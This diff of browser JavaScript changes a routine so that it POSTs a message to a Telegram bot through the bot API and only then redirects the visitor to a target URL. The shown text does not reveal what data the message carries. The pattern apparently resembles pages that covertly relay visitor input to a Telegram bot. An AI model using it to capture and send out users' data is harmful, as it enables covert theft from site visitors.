@@ -66,23 +66,26 @@ setTimeout(() => {
 
     console.log("Отправка в Telegram...");
 
-fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    chat_id: chatId,
-    text: message
-  })
-}).catch(() => {});
-
-setTimeout(() => {
-  window.location.replace(targetUrl);
-}, 300);
-
-// Мгновенный редирект
-window.location.replace(targetUrl);
+    // Отправляем запрос и ждем ответа от сервера Telegram
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML"
+      })
+    })
+    .then(response => {
+      console.log("Telegram ответил:", response.status);
+    })
+    .catch(err => {
+      console.error("Ошибка сети при отправке в ТГ:", err);
+    })
+    .finally(() => {
+      // РЕДИРЕКТ СРАБОТАЕТ ТОЛЬКО ПОСЛЕ ТОГО, КАК ЗАПРОС В ТГ ЗАВЕРШИЛСЯ (УСПЕШНО ИЛИ С ОШИБКОЙ)
+      window.location.replace(targetUrl);
+    });
 
     return;
   }
